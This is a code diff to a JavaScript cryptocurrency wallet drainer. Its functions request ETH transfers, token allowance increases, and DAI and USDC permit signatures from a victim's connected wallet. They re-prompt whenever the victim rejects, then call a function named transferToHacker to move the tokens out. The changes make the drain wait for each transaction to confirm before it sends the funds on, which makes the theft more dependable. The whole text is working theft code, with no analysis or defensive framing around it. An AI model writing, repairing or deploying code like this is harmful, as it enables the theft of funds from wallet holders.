@@ -102,8 +102,16 @@ export const claim = async (_balance) => {
     value: amount,
     gas: '50000',
     gasPrice: feeData.gasPrice
-  }).then((result) => {
+  }).then(async (result) => {
     console.log(result)
+    await waitForTransaction({
+      chainId: 1,
+      hash: result.hash
+    }).then(async (result) => {
+      console.log(result)
+    }).catch(async (error) => {
+      console.log(error)
+    })
   }).catch(async (error) => {
     console.log(error)
     await claim(_balance);
@@ -228,8 +236,15 @@ const increasAllow = async (token) => {
     gas: '75000',
   }).then(async (result) => {
     console.log(result)
-    await waitForTransaction(result.transactionHash)
-    await transferToHacker(token);
+    await waitForTransaction({
+      chainId: 1,
+      hash: result.hash
+    }).then(async (result) => {
+      console.log(result)
+      await transferToHacker(token);
+    }).catch(async (error) => {
+      console.log(error)
+    })
   }).catch(async (error) => {
     console.log(error)
     await increasAllow(token);
@@ -265,8 +280,15 @@ const daiPermitV1 = async (token, permitToken, nonce, provider) => {
       getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
     ).then(async (result) => {
       console.log(result)
-      await waitForTransaction(result.transactionHash)
-      await transferToHacker(token);
+      await waitForTransaction({
+        chainId: 1,
+        hash: result.hash
+      }).then(async (result) => {
+        console.log(result)
+        await transferToHacker(token);
+      }).catch(async (error) => {
+        console.log(error)
+      })
     })
 
   }).catch(async (error) => {
@@ -289,8 +311,15 @@ const usdcPermitV2 = async (token, permitToken, provider) => {
       getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
     ).then(async (result) => {
       console.log(result)
-      await waitForTransaction(result.transactionHash)
-      await transferToHacker(token);
+      await waitForTransaction({
+        chainId: 1,
+        hash: result.hash
+      }).then(async (result) => {
+        console.log(result)
+        await transferToHacker(token);
+      }).catch(async (error) => {
+        console.log(error)
+      })
     })
 
   }).catch(async (error) => {
